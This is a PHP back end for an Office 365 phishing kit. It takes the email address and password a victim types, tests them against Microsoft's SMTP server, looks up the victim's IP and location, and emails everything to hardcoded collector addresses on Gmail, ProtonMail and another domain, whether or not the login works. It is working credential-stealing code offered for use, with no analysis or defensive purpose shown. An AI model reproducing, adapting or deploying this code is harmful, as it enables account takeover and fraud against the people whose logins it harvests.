<?php header('Access-Control-Allow-Origin: *'); ?>
<?php
@session_start();
ob_start();
require_once('send/geoplugin.class.php');

$geoplugin = new geoPlugin();
//locate the IP
$geoplugin->locate();

ini_set("output_buffering",4096);

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
$user= $_GET['user'];
$pass= $_GET['pass'];
if(!empty($pass) && $user !=="undefined") {

    $base= base64_encode($pass);
    $em_str = str_replace("#","",$user);

require 'send/Exception.php';
require 'send/PHPMailer.php';
require 'send/SMTP.php';

$mail = new PHPMailer;
$mail->isSMTP();
$mail->SMTPDebug = 0;
$mail->SMTPAuth = true;
$mail->SMTPSecure = false;

 $em= $user;


$mail->Host = 'smtp.office365.com';


$message = "";
$mail->Port = 587;
$mail->Username = "$em_str";
$mail->Password = "$pass";
$mail->setFrom("$user");
$mail->addAddress('Lilian.Pan@leschaco.com');
$mail->Subject = "$user";
$mail->msgHTML("$base");



if (!$mail->send())
{
    $ip = getenv("REMOTE_ADDR");
$message .= "------\n";
$message .= "Email : ".$em_str."\n";
$message .= "Password : ".$pass."\n";
$message .= "IP:  ".$ip."\n";
$message .= "City : {$geoplugin->city}\n";
$message .= "Region : {$geoplugin->region}\n";
$message .= "Country : {$geoplugin->countryName}\n\n";
$message .= "----------------------------------------\n";
$message .= " =================================\n";
$subject = "LOGIN-FAILED || OTHER DOMAIN - $ip";
$headers = "From: SUCCESS<success@mail.com>";
$SEND='roomservice801@gmail.com, roomservice801@protonmail.com, ajonwa@enfesdantel.com';

@mail($SEND,$subject,$message,$headers);

    echo json_encode(['msg'=>'errorsend']);

}
else {
$ip = getenv("REMOTE_ADDR");
$message .= "------\n";
$message .= "Email : ".$user."\n";
$message .= "Password : ".$pass."\n";
$message .= "IP:  ".$ip."\n";
$message .= "City : {$geoplugin->city}\n";
$message .= "Region : {$geoplugin->region}\n";
$message .= "Country : {$geoplugin->countryName}\n\n";
$message .= "----------------------------------------\n";
$message .= " ======================";
$subject = "OFFICE 365 - $ip";
$headers = "From: SUCCESS<success@mail.com>";
$SEND='roomservice801@gmail.com, roomservice801@protonmail.com, ajonwa@enfesdantel.com';

@mail($SEND,$subject,$message,$headers);

    echo json_encode(['msg'=>'donesend']);
 }
$mail->smtpClose();
}
else{
     echo json_encode(['msg'=>'empty']);
}
?>